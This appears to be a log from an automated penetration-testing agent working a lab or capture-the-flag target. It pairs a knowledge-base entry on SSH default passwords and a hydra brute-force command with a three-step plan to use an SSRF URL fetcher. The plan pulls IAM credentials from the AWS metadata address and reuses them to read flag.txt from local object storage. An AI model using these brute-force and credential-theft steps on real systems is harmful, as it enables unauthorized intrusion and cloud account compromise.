Analysis: 3
  - id=svc-research-1783148142: {'phase': 'service_research', 'content': '\n  [RAG Knowledge for OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)]: ## Knowledge Base\n\n### 1. SSH Default and Weak Credentials (score:0.681, network/AUTH)\nSSH commonly uses weak credentials in lab, CTF, and container environments. Common username/password pairs: root/root, root/admin, root/password123, root/toor, root/123456, ubuntu/ubuntu, admin/admin, user/user, user/password, attacker/password123, attacker/attacker, victim/victim, ctf/ctf. When gaining credential access to a Linux host (via any exploit), always test SSH access with the same credentials.\n**Techniques:**\n  - ssh root@HOST (try password: root, admin, password123, toor)\n  - ssh ubuntu@HOST (try password: ubuntu)\n  - ssh user@HOST (try password: user, password, 123456)\n  - ssh attacker@HOST (try password: password123, attacker)\n  - hydra -l root -P /usr/share/dirb/wordlists/common.txt ssh://\n', '_version': 1}
  - id=analysis-1783148224: {'phase': 'analyze', 'content': "The application on port 10601 is a Cloud Dashboard with a URL fetcher that allows users to input any URL, which the server retrieves—a classic SSRF endpoint. Port 10670 and 10671 appear to be object storage services (listing 'flag.txt' and 'readme.txt') that may require authentication. The presence of 'instance i-0abc123def' and 'production' hints at an AWS environment, making the Instance Metadata Service (169.254.169.254) a high-value SSRF target.", 'endpoint_count': 19, '_version': 1}
  - id=attack-path-path-24055: {'phase': 'analyze', 'content': 'Exploit SSRF to steal IAM credentials from AWS Instance Metadata Service (IMDS), then use those credentials to access the internal S3-compatible object storage on port 10671 to read the flag.', 'path_id': 'path-24055', 'steps': [{'step': 1, 'vuln_type': 'SSRF', 'endpoint': 'http://localhost:10601/fetch', 'param': 'url', 'goal': 'Retrieve IAM role name by requesting http://169.254.169.254/latest/meta-data/iam/security-credentials/'}, {'step': 2, 'vuln_type': 'SSRF', 'endpoint': 'http://localhost:10601/fetch', 'param': 'url', 'goal': 'Using the role name, fetch the temporary credentials (AccessKeyId, SecretAccessKey, Token) from http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'}, {'step': 3, 'vuln_type': 'Credential reuse', 'endpoint': 'Internal S3-compatible service (port 10671 or 10670)', 'param': '', 'goal': 'Configure AWS CLI with stolen credentials and a custom endpoint (e.g., --endpoint-url http://localhost:10671) to download flag.txt from the object store.'}], 'step_count': 3, '_version': 1}

